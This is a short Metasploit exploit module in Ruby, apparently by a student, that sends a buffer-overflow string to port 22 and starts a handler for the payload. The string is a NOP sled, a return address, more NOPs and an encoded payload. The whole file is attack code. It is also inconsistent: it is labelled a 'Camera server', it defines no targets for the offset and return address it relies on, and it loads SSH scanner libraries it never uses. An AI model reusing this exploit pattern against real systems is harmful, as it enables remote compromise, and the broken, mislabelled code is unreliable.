## @Gagandeep K Sur gks007@shsu.edu

require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/ssh'


class MetasploitModule < Msf::Exploit::Remote
  include Msf::Exploit::Remote::Tcp

  def initialize
    super(
      'Name'        => 'Camera server',
      'Description' => %q{
         Camera server to receive images from payload
      }, 
      'Author'      => 'Gagandeep K Sur',
      'License'     =>  MSF_LICENSE
    )
    register_options(
      [
        Opt::RPORT(22),
      ])
  end
  def exploit
    connect
    junk = make_nops(target['Offset'])
    sploit = junk + [target.ret].pack('V')+
      make_nops(50)+payload.encoded
    sock.put(sploit)
    handler
    disconnect
  end

end
